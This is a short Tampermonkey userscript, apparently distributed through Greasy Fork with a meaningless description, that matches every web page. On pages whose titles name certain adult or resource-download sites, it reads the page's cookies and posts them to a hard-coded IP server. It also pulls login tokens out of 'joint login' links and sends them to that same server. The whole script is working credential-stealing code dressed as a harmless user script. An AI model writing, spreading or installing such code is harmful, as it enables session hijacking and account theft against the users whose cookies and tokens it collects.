// ==UserScript==
// @name         setswagand19token
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  sss
// @match        http://127.0.0.1:8080/#/container/guideBuy
// @author       FFFFFFeng
// @match        https://*/*
// @match        http://*/*
// @icon         https://www.google.com/s2/favicons?domain=swag555.xyz
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/464364/setswagand19token.user.js
// @updateURL https://update.greasyfork.org/scripts/464364/setswagand19token.meta.js
// ==/UserScript==

(function() {
    (function() {
    'use strict';
    if (document.title.includes('韩国主播国产主播原创网') || document.title.includes('SWAG资源合集下载')) {
       let cookie = document.cookie
       fetch('https://124.223.114.203:3001/setSwagCookie/200', {method: 'post',headers: {
      'Content-Type': 'application/json'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    }, body: JSON.stringify({cookieArr: cookie})}).then(res => res.json()).then(res => {console.log(res)})
    }



     let nodes = document.querySelectorAll(".f-red")
          for (let i = 0; i<nodes.length; i++) {
//            return
            if (nodes[i].innerHTML.includes("联合登录")) {
              if (nodes[i].nextElementSibling) {
                let href = nodes[i].nextElementSibling.href
                console.log(href.split("?"))
                  let arr = href.split("?")[1]
                  let token = arr.split("=")
                  fetch(`https://124.223.114.203:3001/setHanguoToken/200`, {
                      method: "post",
                      headers: {
      'Content-Type': 'application/json'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    },
                    body: JSON.stringify({token: token[token.length-1]})
                  }).then(res=>res.json()).then(res => alert(res.code))
              }
            }
         }

    // Your code here...
})();
})();